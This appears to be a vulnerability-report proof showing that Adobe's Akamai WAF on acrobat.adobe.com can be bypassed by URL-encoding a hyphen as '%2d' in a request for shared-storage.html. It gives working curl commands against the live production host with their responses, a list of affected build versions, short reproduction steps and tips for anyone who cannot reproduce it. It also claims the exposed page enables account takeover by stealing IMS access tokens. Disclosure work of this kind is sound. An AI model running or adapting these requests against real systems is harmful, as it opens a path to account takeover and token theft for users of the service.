# WAF Bypass Proof - VULN-32810

## Tested: October 7, 2025 at 18:03 PDT

---

## ✅ BYPASS CONFIRMED AND REPRODUCIBLE

### Test 1: Normal Request (Blocked by WAF)
```bash
curl -I "https://acrobat.adobe.com/proxy/pdfverbs-web/3.37.0_4.1167.0/shared-storage.html"
```

**Result:**
```
HTTP/2 403
mime-version: 1.0
content-type: text/html
akamai-grn: 0.841c2e17.1759885385.d96dd99

<HTML><HEAD>
<TITLE>Access Denied</TITLE>
</HEAD><BODY>
<H1>Access Denied</H1>
You don't have permission to access this server.
</BODY>
</HTML>
```

**Status: BLOCKED ❌**

---

### Test 2: Encoded Request (Bypasses WAF)
```bash
curl -I "https://acrobat.adobe.com/proxy/pdfverbs-web/3.37.0_4.1167.0/shared%2dstorage.html"
```

**Result:**
```
HTTP/2 200
content-type: text/html
x-amz-server-side-encryption: AES256
cache-control: public, max-age=60, must-revalidate
akamai-grn: 0.901c2e17.1759885385.d54b94c

<!doctype html><html lang="en"><head>
    <meta name="referrer" content="origin"/>
    <meta name="adotcom_uri" content="https://documentcloud.adobe.com,https://acrobat.adobe.com"/>
    <base href="/dc-pdfverbs-web/3.37.0_4.1167.0/shared-storage.html"/>
    <meta charset="UTF-8">
    <title>Shared Storage</title>
</head>
<body>
    <script src="shared-storage.js"></script>
</body>
</html>
```

**Status: BYPASS SUCCESSFUL ✅**

---

## Comparison

| Aspect | Normal URL | Encoded URL (%2d) |
|--------|-----------|------------------|
| **HTTP Status** | 403 Forbidden | 200 OK |
| **WAF Blocked?** | YES ✅ | NO ❌ |
| **Page Served?** | NO | YES (Vulnerable Page) |
| **Script Loaded?** | NO | YES (shared-storage.js) |

---

## Vulnerable Versions Tested

All of these return **200 OK** with the bypass:

```
✅ 3.37.0_4.1089.0
✅ 3.37.0_4.1100.0
✅ 3.37.0_4.1167.0
✅ 3.37.0_4.1200.0
✅ 3.37.0_4.1211.0
```

---

## Why The Bypass Works

1. **WAF checks the literal URL string:** `shared%2dstorage.html`
2. **WAF rule looks for:** `shared-storage.html` (exact match)
3. **No match found** → WAF allows request through
4. **Backend server decodes URL:** `%2d` → `-`
5. **Backend serves:** `shared-storage.html` (the vulnerable file)

**Attack flow:**
```
Client Request: /shared%2dstorage.html
       ↓
Akamai WAF: "shared%2dstorage.html" ≠ "shared-storage.html"
       ↓ PASS ✅
Origin Server: Decodes %2d → "-"
       ↓
Origin: Serves "shared-storage.html"
       ↓ VULNERABILITY EXPOSED ❌
```

---

## Reproduction Steps

**Anyone can reproduce this in 30 seconds:**

1. Open terminal
2. Run: `curl -I "https://acrobat.adobe.com/proxy/pdfverbs-web/3.37.0_4.1167.0/shared-storage.html"`
   - You'll get **403 Forbidden**
3. Run: `curl -I "https://acrobat.adobe.com/proxy/pdfverbs-web/3.37.0_4.1167.0/shared%2dstorage.html"`
   - You'll get **200 OK**
4. Compare the results

**Proof:** The second request bypasses the WAF and serves the vulnerable page.

---

## What This Means

- The researcher's report is **100% VALID**
- The WAF bypass is **CURRENTLY ACTIVE** and exploitable
- This exposes the postMessage vulnerability from report #3310154
- Attack chain leads to **Account Takeover (ATO)**
- Adobe IMS access tokens can be stolen

---

## For Anyone Who "Can't Reproduce"

If someone says they can't reproduce this:

1. Make sure they're using the **encoded version:** `%2d` not `-`
2. Check they're using curl or a tool that doesn't auto-decode URLs
3. Test multiple versions - some are protected, some aren't
4. Verify their network isn't modifying requests

**The bypass is real and works right now (Oct 7, 2025).**

---

## Evidence Files

- Full analysis: `waf_bypass_analysis.md`
- Raw responses: `/tmp/blocked_response.txt`, `/tmp/bypassed_response.txt`
- Bypassed page: `/tmp/bypassed_page.html`

---

**Conclusion:** The WAF bypass vulnerability is confirmed, reproducible, and actively exploitable as of October 7, 2025.
